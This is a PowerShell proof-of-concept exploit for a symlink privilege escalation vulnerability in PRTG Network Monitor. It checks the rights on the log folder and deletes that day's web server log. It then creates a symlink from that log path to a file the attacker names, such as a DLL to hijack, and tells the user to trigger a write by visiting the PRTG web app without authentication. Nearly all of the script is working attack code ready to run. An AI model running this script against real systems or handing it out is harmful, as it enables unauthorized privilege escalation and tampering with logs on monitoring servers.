<#
.SYNOPSIS
	Powershell script to exploit PRTG Symlink Privilege Escalation Vulnerability.
.DESCRIPTION
	Found by ParagonSec @ Critical Start - Section 8
#>

$DateStr = Get-Date -format "yyyyMMdd"

# Folder being used for exploitation. Can change this to any other PRTG Log Folder but will need to add persistence to symlink.
$VulnFolder = "C:\ProgramData\Paessler\PRTG Network Monitor\Logs (Web Server)\"
$VulnFile = "C:\ProgramData\Paessler\PRTG Network Monitor\Logs (Web Server)\prtg" + $DateStr + ".log"

# Google's Project Zero Symboliclink-testing-tools at https://github.com/googleprojectzero/symboliclink-testing-tools. Change to the location you have it!
$SymlinkApp = "D:\Programs\symboliclink-testing-tools-master\Debug\CreateSymlink.exe"


Write-Host "[+] Privilege Escalation on PRTG Network Monitor" -ForegroundColor yellow
Write-Host "[+] Tested on version 18.2.41.1652`n" -ForegroundColor yellow
Write-Host "[+] Running as $env:UserName`n" -ForegroundColor yellow

if ([System.IO.Directory]::Exists($VulnFolder)) {

	Write-Host "[!] PRTG Log Directory Rights" -ForegroundColor yellow
	cacls $VulnFolder
}
else {
	Write-Host "[!] No Log Web Server directory present. Check to see if you are vulnerable or choose another log directory!" -ForegroundColor red
	Exit
}
	
if ([System.IO.File]::Exists($VulnFile)) {
	
	Write-Host "[!] PRTG Web Log Rights" -ForegroundColor yellow
	cacls $VulnFile

	Write-Host "[+] Deleting Vulnerable Log File!" -ForegroundColor yellow
	del $VulnFile
}
else {
	Write-Host "[!] No Log file present. Check to see if you are vulnerable or choose another log directory!" -ForegroundColor red
	Exit
}
	
# Where you want your new file to be directed to! (e.g. C:\exploit.dll)
$Exploit = Read-Host -Prompt "Enter full path and extention of where your symlink should go for exploitation (e.g. DLL Hijacking): "

Write-Host "[+] Creating Symlink" -ForegroundColor yellow
Write-Host "[!] Visit the PRTG Web Application (Don't need authentication) to write to the log file!" -ForegroundColor yellow
Start-Process -FilePath $SymlinkApp -ArgumentList "`"$VulnFile`" `"$Exploit`""

Write-Host -NoNewLine 'Press any key to continue...';
$null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');

Write-Host "`n[!] Rights for your $Exploit file" -ForegroundColor green
cacls $Exploit

Write-Host "`n[!] Place your payload into $Exploit file and enjoy the pwnage!" -ForegroundColor green
